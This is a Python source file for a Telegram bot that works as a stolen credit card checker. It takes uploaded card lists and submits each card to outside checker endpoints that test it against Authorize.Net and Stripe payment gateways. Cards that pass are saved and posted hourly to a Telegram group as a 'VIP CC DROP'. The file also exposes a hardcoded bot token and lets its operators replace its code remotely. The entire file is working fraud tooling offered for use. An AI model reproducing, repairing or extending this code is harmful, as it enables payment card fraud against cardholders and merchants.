import telebot
import requests
import ssl
import os
import threading
import time
import sys

# Replace with your bot token
bot_token = "7401990916:AAH_9par8aEY1a92LDnjjf3Zxjy8oFxYyzg"
bot = telebot.TeleBot(bot_token)

# Replace with your Telegram group ID
group_id = -1002181497238

# Replace with your owner's Telegram ID
owner_id = 1192484969
owner_id_2 = 1469152765  # Add the new owner ID

# Path to the CC file
cc_file = "cc.txt"
# Path to the database file
database_file = "database.txt"

# Flag to control CC checking
checking_cc = False

# Flag to indicate a restart is needed
restart_needed = False

# Variables to track bot status and CCs checked
total_ccs_checked = 0
total_ccs_checked_api2 = 0  # Track CCs checked by the second API
total_ccs_checked_api3 = 0  # Track CCs checked by the third API
bot_status = "Idle"

# Variables to store the last checked CC and API number for remembering
last_checked_cc = None
last_checked_api = 1 

def send_alive_message():
    try:
        bot.send_message(owner_id, "Boss, I'm alive!")
        bot.send_message(owner_id_2, "Boss, I'm alive!")  # Send to the second owner
    except Exception as e:
        print(f"Error sending alive message: {e}")
    threading.Timer(3000000, send_alive_message).start()  # Schedule next message in 5 minutes

@bot.message_handler(commands=['add'])
def add_ccs(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, "Send me a .txt file with CCs.")
        bot.register_next_step_handler(message, handle_file)
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['update'])
def handle_update(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, "Send me the updated main.py file.")
        bot.register_next_step_handler(message, handle_file)
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            if message.document.file_name == "main.py":
                with open("main.py", 'w') as f:
                    f.write(downloaded_file.decode('utf-8'))
                global restart_needed
                restart_needed = True
                bot.send_message(message.chat.id, "New code received. Restarting...")
            else:
                with open(cc_file, 'a') as f:
                    f.write(downloaded_file.decode('utf-8'))
                bot.send_message(message.chat.id, "CCs added successfully!")
        except Exception as e:
            bot.send_message(owner_id, f"Error: {e}")
            bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
            bot.send_message(message.chat.id, "An error occurred while adding CCs.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['clear'])
def clear_ccs(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        try:
            os.remove(cc_file)
            bot.send_message(message.chat.id, "CCs cleared successfully!")
        except FileNotFoundError:
            bot.send_message(message.chat.id, "There are no CCs to clear.")
        except Exception as e:
            bot.send_message(owner_id, f"Error: {e}")
            bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
            bot.send_message(message.chat.id, "An error occurred while clearing CCs.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['ss'])
def start_checking(message):
    global checking_cc, bot_status, last_checked_cc, last_checked_api
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        checking_cc = True  # Start checking immediately
        bot_status = "Checking CCs"
        bot.send_message(message.chat.id, "Started checking CCs.")
        check_and_remove_ccs()
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['verify'])
def check_bot_status(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, f"Bot Status: {bot_status}\nTotal CCs Checked (API 1): {total_ccs_checked}\nTotal CCs Checked (API 2): {total_ccs_checked_api2}\nTotal CCs Checked (API 3): {total_ccs_checked_api3}")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['restart'])
def restart_bot(message):
    global restart_needed
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        restart_needed = True
        bot.send_message(message.chat.id, "Restarting...")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

# Corrected check_cc function
def check_cc(cc):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        # No need to create a custom context here, just use verify=False
        response = requests.get(f"https://xronak.site/apicv.php?lista={cc}", headers=headers, timeout=130, verify=False)
        result = response.text.strip()
        return result
    except requests.exceptions.ConnectionError as e:
        bot.send_message(owner_id, f"Error checking CC (API 1): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 1): {cc} - {e}")  # Send error to the second owner
        return None
    except Exception as e:
        bot.send_message(owner_id, f"Error checking CC (API 1): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 1): {cc} - {e}")  # Send error to the second owner
        return None

def check_cc_api2(cc):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        for attempt in range(3):  # Try 3 times
            try:
                response = requests.get(f"https://xronak.site/scrapper2.php?lista={cc}", headers=headers, timeout=130, verify=False)
                result = response.text.strip()
                return result
            except requests.exceptions.ConnectionError as e:
                print(f"Error checking CC (API 2): {cc} - {e}. Retrying in 5 seconds...")
                time.sleep(5)
        return None  # If all attempts fail, return None
    except Exception as e:
        print(f"Error checking CC (API 2): {cc} - {e}")
        return None

def check_cc_api3(cc):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        response = requests.get(f"https://xronak.site/apiauth.php?lista={cc}", headers=headers, timeout=130, verify=False)
        result = response.text.strip()
        return result
    except requests.exceptions.ConnectionError as e:
        bot.send_message(owner_id, f"Error checking CC (API 3): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 3): {cc} - {e}")  # Send error to the second owner
        return None
    except Exception as e:
        bot.send_message(owner_id, f"Error checking CC (API 3): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 3): {cc} - {e}")  # Send error to the second owner
        return None

def check_and_remove_ccs():
    global checking_cc, total_ccs_checked, total_ccs_checked_api2, total_ccs_checked_api3, bot_status, last_checked_cc, last_checked_api
    try:
        with open(cc_file, 'r') as f:
            ccs = f.readlines()

            # If there's data in the database, use it to resume checking
            if os.path.exists(database_file):
                with open(database_file, 'r') as db_file:
                    try:
                        last_checked_cc = db_file.readline().strip()
                        last_checked_api = int(db_file.readline().strip())
                    except (IndexError, ValueError):
                        # Handle cases where the database file is empty or corrupted
                        last_checked_cc = None
                        last_checked_api = 1

            # Find the starting point for checking
            start_index = 0
            if last_checked_cc is not None:
                # Now we load from database first, then find index
                try:
                    start_index = ccs.index(last_checked_cc)
                except ValueError:
                    # If last_checked_cc is not found, start from the beginning
                    start_index = 0

            for cc in ccs[start_index:]:
                cc = cc.strip()

                # Check the API based on the last_checked_api
                if last_checked_api == 1:
                    result1 = check_cc(cc)
                    if result1 and '✅' in result1:
                        bot.send_message(group_id, f"❀ Kafka VIP\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ CC: {cc}\n✿ Response » 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n✿ Result: {result1}\n✿⁠ GateWay » Authorize Net 1$🌥️\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ Owner » @kafkachecker")
                        with open("vip.txt", "a") as vip_file:
                            vip_file.write(cc + "\n")
                    last_checked_api = 2  # Move to the next API
                    last_checked_cc = cc  # Update the last checked CC
                elif last_checked_api == 2:
                    # Wait for 5 seconds before checking the second API
                    time.sleep(5)
                    result2 = check_cc_api2(cc)
                    if result2 and '✅' in result2:
                        bot.send_message(group_id, f"❀ Kafka VIP\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ CC: {cc}\n✿ Response » 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n✿ Result: {result2}\n✿⁠ GateWay » Stripe 1$⛈️\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ Owner » @kafkachecker")
                        with open("vip.txt", "a") as vip_file:
                            vip_file.write(cc + "\n")
                    last_checked_api = 3  # Move to the next API
                    last_checked_cc = cc  # Update the last checked CC
                elif last_checked_api == 3:
                    # Check the third API after a 3-minute delay, but continue checking with the first two APIs
                    time.sleep(180)
                    result3 = check_cc_api3(cc)
                    if result3 and '✅' in result3:
                        bot.send_message(group_id, f"❀ Kafka VIP\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ CC: {cc}\n✿ Response » 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n✿ Result: {result3}\n✿⁠ GateWay » Stripe Auth 2.0 ⛅\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ Owner » @kafkachecker")
                        with open("vip.txt", "a") as vip_file:
                            vip_file.write(cc + "\n")
                    last_checked_api = 1  # Reset to the first API for the next CC
                    last_checked_cc = cc  # Update the last checked CC
                    # Save the last checked CC and API number to the database
                    with open(database_file, 'w') as db_file:
                        db_file.write(last_checked_cc + '\n')
                        db_file.write(str(last_checked_api) + '\n')

                # Increment counters for all APIs, even if no '✅' is found
                total_ccs_checked += 1
                total_ccs_checked_api2 += 1
                total_ccs_checked_api3 += 1

        # Clear the file after checking all CCs
        with open(cc_file, 'w') as f:
            f.writelines("")  # Clear the file
        checking_cc = False  # Stop checking after completion
        bot_status = "Idle"
        bot.send_message(owner_id, "CC checking completed!")
        bot.send_message(owner_id_2, "CC checking completed!")  # Send message to the second owner
    except FileNotFoundError:
        bot.send_message(owner_id, "No CCs to check.")
        bot.send_message(owner_id_2, "No CCs to check.")  # Send message to the second owner
        checking_cc = False
        bot_status = "Idle"
    except Exception as e:
        bot.send_message(owner_id, f"Error during CC checking: {e}")
        bot.send_message(owner_id_2, f"Error during CC checking: {e}")  # Send error to the second owner
        checking_cc = False
        bot_status = "Idle"

def restart_bot():
    global restart_needed
    if restart_needed:
        os.execv(__file__, sys.argv)

def send_vip_ccs():
    try:
        with open("vip.txt", "r") as vip_file:
            ccs = vip_file.readlines()
            if ccs:  # Only send if there are CCs
                total_ccs = len(ccs)
                bot.send_document(group_id, open("vip.txt", "rb"), caption=f"⁠✿ Kafka VIP CC DROP\n✿ MORE COME AFTER ONE HOUR LATER\nTotal CCs: {total_ccs}")
                with open("vip.txt", "w") as f:
                    f.writelines("")  # Clear the file
    except Exception as e:
        bot.send_message(owner_id, f"Error sending VIP CCs: {e}")
        bot.send_message(owner_id_2, f"Error sending VIP CCs: {e}")

@bot.message_handler(commands=['ca'])
def clear_all_data(message):
    if message.from_user.id in [owner_id, owner_id_2]:
        try:
            # Clear CC file
            os.remove(cc_file)
            bot.send_message(message.chat.id, "CCs cleared successfully!")
            # Clear database file
            os.remove(database_file)
            bot.send_message(message.chat.id, "Database cleared successfully!")
            # Clear VIP file
            os.remove("vip.txt")
            bot.send_message(message.chat.id, "VIP CCs cleared successfully!")

            global total_ccs_checked, total_ccs_checked_api2, total_ccs_checked_api3, last_checked_cc, last_checked_api
            total_ccs_checked = 0
            total_ccs_checked_api2 = 0
            total_ccs_checked_api3 = 0
            last_checked_cc = None
            last_checked_api = 1

            bot.send_message(message.chat.id, "All data cleared! Bot is ready for new CCs.")
        except FileNotFoundError:
            bot.send_message(message.chat.id, "Some files are not found. Please check.")
        except Exception as e:
            bot.send_message(owner_id, f"Error clearing data: {e}")
            bot.send_message(owner_id_2, f"Error clearing data: {e}")  # Send error to the second owner
            bot.send_message(message.chat.id, "An error occurred while clearing data.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")


# ... (Rest of your existing code) ...

# Start the bot and the "I'm alive" message scheduler
send_alive_message()  # Start the initial timer
threading.Timer(3600, send_vip_ccs).start()  # Start the hourly VIP CC sending

while True:
    try:
        bot.polling(none_stop=True, interval=0)  # Always keep polling
        restart_bot()
    except Exception as e:
        bot.send_message(owner_id, f"Error: {e}")
        bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
        print(f"Bot restarting: {e}")
        time.sleep(5)  # Wait for 5 seconds before restarting